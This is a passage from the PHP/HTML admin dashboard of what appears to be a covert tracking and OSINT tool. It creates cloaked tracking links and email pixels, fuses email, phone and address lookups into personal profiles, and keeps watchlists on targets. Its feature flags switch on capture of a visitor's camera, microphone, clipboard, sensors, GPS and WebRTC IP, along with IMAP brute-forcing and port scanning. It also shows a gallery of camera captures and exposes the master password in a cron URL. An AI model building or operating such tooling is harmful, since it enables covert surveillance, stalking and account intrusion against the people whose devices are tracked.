      <label style="font-size:11px"><input type="checkbox" name="deep" value="1" style="width:auto"> deep</label><button>Run</button></form>
    <div class="out" id="oEmail">ready</div>
    <h2>Phone</h2>
    <form class="inl" onsubmit="return run('phone',this)"><input name="n" placeholder="+44 7700 900123" size="17" required>
      <label style="font-size:11px"><input type="checkbox" name="deep" value="1" style="width:auto"> deep</label><button>Run</button></form>
    <div class="out" id="oPhone">ready</div>
    <h2>IP address</h2>
    <form class="inl" onsubmit="return run('ip',this)"><input name="ip" placeholder="8.8.8.8" size="15" required>
      <label style="font-size:11px"><input type="checkbox" name="deep" value="1" style="width:auto"> ports</label><button>Run</button></form>
    <div class="out" id="oIp">ready</div>
    <h2>Username sweep</h2>
    <form class="inl" onsubmit="return run('user',this)"><input name="u" placeholder="torvalds" size="16" required><button>Sweep</button></form>
    <div class="out" id="oUser">ready</div>
  </div>
  <div>
    <h2>Domain</h2>
    <form class="inl" onsubmit="return run('whois',this)"><input name="d" placeholder="example.com" size="18" required><button>Run</button></form>
    <div class="out" id="oWhois">ready</div>
    <h2>DNS records</h2>
    <form class="inl" onsubmit="return run('dns',this)"><input name="d" placeholder="example.com" size="18" required><button>Dump</button></form>
    <div class="out" id="oDns">ready</div>
    <h2>Subdomains (crt.sh)</h2>
    <form class="inl" onsubmit="return run('subs',this)"><input name="d" placeholder="example.com" size="18" required><button>Enumerate</button></form>
    <div class="out" id="oSubs">ready</div>
    <h2>TLS / headers</h2>
    <form class="inl" onsubmit="return run('tls',this)"><input name="d" placeholder="example.com" size="18" required><button>TLS</button></form>
    <div class="out" id="oTls">ready</div>
    <h2>Fused profile</h2>
    <form class="inl" onsubmit="return runProfile(this)">
      <input name="e" placeholder="email" size="15"><input name="n" placeholder="phone" size="13"><input name="a" placeholder="address" size="14">
      <button>Fuse</button></form>
    <div class="out" id="oProfile">ready</div>
  </div>
</section>
</div>

<div class="tab" id="tab-links">
<section><h2>Create tracking link</h2>
<form class="inl" method="post" action="?t=link_new&i=1">
  <input name="url" placeholder="https://destination.example" size="26" required>
  <input name="slug" placeholder="custom-slug" size="12">
  <input name="label" placeholder="label" size="10"><input name="expires_days" placeholder="days" size="5" type="number">
  <input name="max_clicks" placeholder="max" size="5" type="number"><input name="password" placeholder="pw" size="7">
  <input name="utm" placeholder="utm_source=li" size="16">
  <label style="font-size:11px"><input type="checkbox" name="cloak" value="1" style="width:auto"> cloak</label>
  <button>Create</button></form>
<div class="wrap"><table><tr><th>Short + QR</th><th>Destination</th><th>Clicks</th><th>Expires</th><th></th></tr>
<?php foreach ($links as $l): $u = url_for(['t'=>'l','s'=>$l['slug']]); ?>
<tr><td><a href="<?= h($u) ?>" target="_blank"><code><?= h($u) ?></code></a>
  <a href="?t=qr&d=<?= urlencode($u) ?>&i=1" target="_blank">QR</a></td>
<td><?= h($l['destination']) ?></td><td><?= (int)$l['clicks'] ?></td><td><?= h($l['expires_at'] ?? '-') ?></td>
<td><a href="?t=link_del&s=<?= h($l['slug']) ?>&i=1">del</a></td></tr><?php endforeach; ?></table></div>
</section>
<section><h2>Email pixels</h2>
<form class="inl" method="post" action="?t=email_new&i=1">
  <input name="to" placeholder="recipient@example.com" size="20"><input name="subject" placeholder="subject" size="16"><button>Create</button></form>
<div class="wrap"><table><tr><th>Pixel</th><th>Opens</th><th>Last</th></tr>
<?php foreach ($emails as $e): $p = url_for(['t'=>'px','e'=>$e['slug']]); ?>
<tr><td><a href="<?= h($p) ?>" target="_blank"><code><?= h($p) ?></code></a></td><td><?= (int)$e['opens'] ?></td><td><?= h($e['last_open'] ?? '-') ?></td></tr>
<?php endforeach; ?></table></div></section>
</div>

<div class="tab" id="tab-watch">
<section><h2>Watchlist - re-checked by cron</h2>
<form class="inl" method="post" action="?t=watch_add&i=1">
  <select name="kind"><option>phone</option><option>email</option><option>domain</option></select>
  <input name="value" placeholder="+15551234567 / a@b.com" size="20" required>
  <input name="channel" placeholder="ntfy" size="12"><button>Watch</button></form>
<div class="wrap"><table><tr><th>Kind</th><th>Value</th><th>Channel</th><th>Runs</th><th>Changes</th><th>Last</th><th></th></tr>
<?php foreach ($watch as $w): ?><tr><td><?= h($w['kind']) ?></td><td><code><?= h($w['value']) ?></code></td>
<td><?= h($w['channel'] ?: '-') ?></td><td><?= (int)$w['runs'] ?></td><td><?= (int)$w['changes'] ?></td>
<td><?= h($w['last_run'] ?? 'never') ?></td><td><a href="?t=watch_del&id=<?= (int)$w['id'] ?>&i=1">del</a></td></tr><?php endforeach; ?>
</table></div>
<p class="muted" style="font-size:12px">External cron: <code><?= h(base_url()) ?>?t=cron&amp;secret=<?= h($GLOBALS['CFG']['master_password']) ?>&amp;i=1</code></p>
</section>
</div>

<div class="tab" id="tab-jobs">
<section><h2>Async job queue</h2>
<form class="inl" method="get" action="?t=job_new"><input type="hidden" name="i" value="1">
  <select name="kind"><option>email</option><option>phone</option><option>ip</option><option>user</option><option>domain</option><option>subs</option><option>tls</option></select>
  <input name="value" placeholder="value" size="20"><input name="notify" placeholder="notify phone" size="14">
  <input name="priority" type="number" value="5" style="width:60px"><button>Queue</button></form>
<div class="wrap"><table><tr><th>#</th><th>Kind</th><th>Status</th><th>Attempts</th><th>Created</th><th>Finished</th></tr>
<?php foreach ($jobs as $j): ?><tr><td><?= (int)$j['id'] ?></td><td><?= h($j['kind']) ?></td>
<td><span class="pill"><?= h($j['status']) ?></span></td><td><?= (int)$j['attempts'] ?></td><td><?= h($j['created']) ?></td><td><?= h($j['finished'] ?? '-') ?></td></tr>
<?php endforeach; ?></table></div>
<p><a href="?t=jobs&run=1&n=5&json=1" target="_blank">Run 5 jobs now</a></p>
</section>
</div>

<div class="tab" id="tab-keys">
<section><h2>API keys</h2>
<form class="inl" method="get" action="?t=key_new"><input type="hidden" name="i" value="1">
  <input name="label" placeholder="label" size="14">
  <select name="scope"><option>read</option><option>write</option><option>admin</option></select>
  <input name="quota" type="number" placeholder="quota/h" style="width:80px"><button>Create key</button></form>
<div class="wrap"><table><tr><th>Label</th><th>Scope</th><th>Calls</th><th>Last used</th><th></th></tr>
<?php foreach ($keys as $k): ?><tr><td><?= h($k['label']) ?></td><td><?= h($k['scope']) ?></td>
<td><?= (int)$k['calls'] ?></td><td><?= h($k['last_used'] ?? '-') ?></td>
<td><a href="?t=key_del&id=<?= (int)$k['id'] ?>&i=1">del</a></td></tr><?php endforeach; ?></table></div>
<h2>REST surface</h2>
<div class="out">GET ?t=v1&amp;r=email&amp;e=a@b.com&amp;key=KEY
GET ?t=v1&amp;r=ip&amp;ip=8.8.8.8&amp;key=KEY
GET ?t=v1&amp;r=user&amp;u=torvalds&amp;key=KEY
GET ?t=v1&amp;r=tls&amp;d=example.com&amp;key=KEY
GET ?t=v1&amp;r=pass&amp;p=hunter2&amp;key=KEY
GET ?t=v1&amp;r=alerts&amp;key=KEY
GET ?t=v1&amp;r=points&amp;key=KEY</div>
</section>
</div>

<div class="tab" id="tab-logs">
<section><h2>Feature flags</h2>
<form method="post" action="?t=settings&i=1"><div class="flags">
<?php foreach (['tracking_enabled'=>'Tracking','osint_enabled'=>'OSINT','consent_required'=>'Consent page','collect_geo'=>'Geo',
                'collect_camera'=>'Camera','collect_mic'=>'Mic','collect_clipboard'=>'Clipboard','collect_sensors'=>'Motion',
                'collect_webrtc'=>'WebRTC IP','collect_heatmap'=>'Click heatmap','smtp_verify'=>'SMTP verify','imap_brute'=>'IMAP brute',
                'ddg_enabled'=>'Web search','geocode_enabled'=>'Geocoding','doh_fallback'=>'DoH','lazy_cron'=>'Lazy cron',
                'jobs_enabled'=>'Job queue','bot_enabled'=>'Telegram bot','dnsbl_enabled'=>'DNSBL','tor_check'=>'Tor check','ports_enabled'=>'Port scan']
    as $k=>$lbl): ?>
  <label><input type="checkbox" name="<?= $k ?>" value="1" <?= flag($k)?'checked':'' ?> style="width:auto"><?= h($lbl) ?></label>
<?php endforeach; ?></div>
<div class="inl" style="margin-top:8px">
  <input name="pool_concurrency" type="number" min="2" max="24" value="<?= setting_int('pool_concurrency',8) ?>" title="concurrency" style="width:70px">
  <input name="rate_limit_per_hour" type="number" value="<?= setting_int('rate_limit_per_hour') ?>" title="rate/h" style="width:90px">
  <input name="retention_days" type="number" value="<?= setting_int('retention_days') ?>" title="retention" style="width:90px">
  <input name="new_password" type="password" placeholder="new master password" size="18">
  <button>Save</button></div></form>
</section>
<?php if ($alerts): ?><section><h2>Alerts</h2><div class="wrap"><table>
<?php foreach ($alerts as $a): ?><tr><td><span class="pill <?= $a['severity']==='high'?'hi':($a['severity']==='medium'?'me':'') ?>"><?= h($a['severity']) ?></span></td>
<td><?= h($a['ts']) ?></td><td><?= h($a['message']) ?></td></tr><?php endforeach; ?></table></div></section><?php endif; ?>
<?php if ($caps): ?><section><h2>Camera captures</h2><div class="thumbs">
<?php foreach ($caps as $c): ?><a href="?t=cap&id=<?= (int)$c['id'] ?>" target="_blank"><img src="?t=cap&id=<?= (int)$c['id'] ?>" loading="lazy"></a><?php endforeach; ?>
</div></section><?php endif; ?>
<section><h2>Recent events</h2><div class="wrap"><table id="ev">
<tr><th>Time</th><th>Kind</th><th>IP</th><th>Address</th><th>Src</th><th>Device</th><th>Anomaly</th><th>Target</th></tr></table></div></section>
<section><h2>Audit</h2><div class="wrap"><table>
<?php foreach ($audit as $a): ?><tr><td><?= h($a['ts']) ?></td><td><?= h($a['actor']) ?></td><td><?= h($a['action']) ?></td><td><?= h($a['detail']) ?></td></tr><?php endforeach; ?>
</table></div></section>
</div>

<script>
document.querySelectorAll('.tabs button').forEach(function(b){
  b.onclick=function(){
    document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('on'));
    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('on'));
    b.classList.add('on'); document.getElementById('tab-'+b.dataset.tab).classList.add('on');
  };
});
function run(route, form){
  var out = document.getElementById('o' + route.charAt(0).toUpperCase() + route.slice(1));
  var qs = new URLSearchParams(); new FormData(form).forEach(function(v,k){ qs.set(k,v); });
  qs.set('json','1'); if(out) out.textContent='running...';
  fetch('?t='+route+'&log=1&i=1&'+qs.toString()).then(r=>r.json())
    .then(d=>{ if(out) out.textContent=JSON.stringify(d,null,2); }).catch(e=>{ if(out) out.textContent='error: '+e; });
  return false;
}
function runProfile(form){
  var out = document.getElementById('oProfile'); out.textContent='fusing...';
  var qs = new URLSearchParams(); new FormData(form).forEach(function(v,k){ if(v) qs.append(k,v); });
  qs.set('json','1');
  fetch('?t=profile&i=1&'+qs.toString()).then(r=>r.json())
    .then(d=>out.textContent=JSON.stringify(d,null,2)).catch(e=>out.textContent='error: '+e);
  return false;
}
fetch('?t=api&i=1&days=14').then(r=>r.json()).then(function(d){
  new Chart(document.getElementById('ch'),{type:'line',
    data:{labels:Object.keys(d.series),datasets:[{data:Object.values(d.series),borderColor:'#3b82f6',
      backgroundColor:'rgba(59,130,246,.14)',fill:true,tension:.35,pointRadius:2}]},
    options:{plugins:{legend:{display:false}},scales:{x:{ticks:{color:'#8b98ab'},grid:{color:'#1d2531'}},
      y:{ticks:{color:'#8b98ab'},grid:{color:'#1d2531'},beginAtZero:true}}}});
  var map = L.map('map').setView([20,0],2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19,attribution:'OSM'}).addTo(map);
  var pts = d.points.filter(p=>p.lat&&p.lon), b=[];
  pts.forEach(function(p){ var gps = p.geo_src==='gps';
    L.circleMarker([p.lat,p.lon],{radius:gps?7:4,color:gps?'#4ade80':'#60a5fa',
      fillColor:gps?'#4ade80':'#60a5fa',fillOpacity:gps?.8:.45,weight:1}).addTo(map)
      .bindPopup('<b>'+(p.city||'')+(p.country?', '+p.country:'')+'</b><br>'+(p.address||'')+'<br>'+p.ts);
    b.push([p.lat,p.lon]); });
  if(b.length) map.fitBounds(b,{padding:[30,30],maxZoom:12});
  document.getElementById('ev').insertAdjacentHTML('beforeend', d.recent.map(r=>
    '<tr><td>'+r.ts+'</td><td><span class="pill">'+r.kind+'</span></td><td>'+(r.ip||'')+'</td><td>'+
    (r.address||r.city||'')+'</td><td>'+(r.geo_src||'ip')+'</td><td>'+((r.browser||'')+' '+(r.os||''))+'</td><td>'+
    (r.anomaly?'<span class="pill hi">'+r.anomaly+'</span>':'')+'</td><td>'+String(r.target||r.email||r.phone_e164||'').slice(0,55)+'</td></tr>').join(''));
});
</script></body></html>
    <?php
}